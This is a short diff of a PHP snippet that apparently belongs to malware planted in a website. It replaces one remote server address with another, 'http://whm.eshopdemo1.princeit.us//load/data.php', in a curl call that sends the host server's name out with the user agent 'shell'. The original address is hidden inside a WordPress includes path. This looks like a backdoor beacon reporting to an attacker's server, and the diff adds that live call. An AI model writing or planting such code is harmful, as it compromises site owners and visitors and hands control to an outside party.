@@ -2,7 +2,7 @@
   $curl = curl_init();
  curl_setopt_array($curl, [
     CURLOPT_RETURNTRANSFER => 1,
-    CURLOPT_URL => 'http://tuyensinhhangkhong.tvcgroup.com.vn//wp-includes/css/dist/data.php?s='.$_SERVER["SERVER_NAME"].'',
+    CURLOPT_URL => 'http://whm.eshopdemo1.princeit.us//load/data.php?s='.$_SERVER["SERVER_NAME"].'',
     CURLOPT_USERAGENT => 'shell'
 ]);
  $resp = curl_exec($curl);
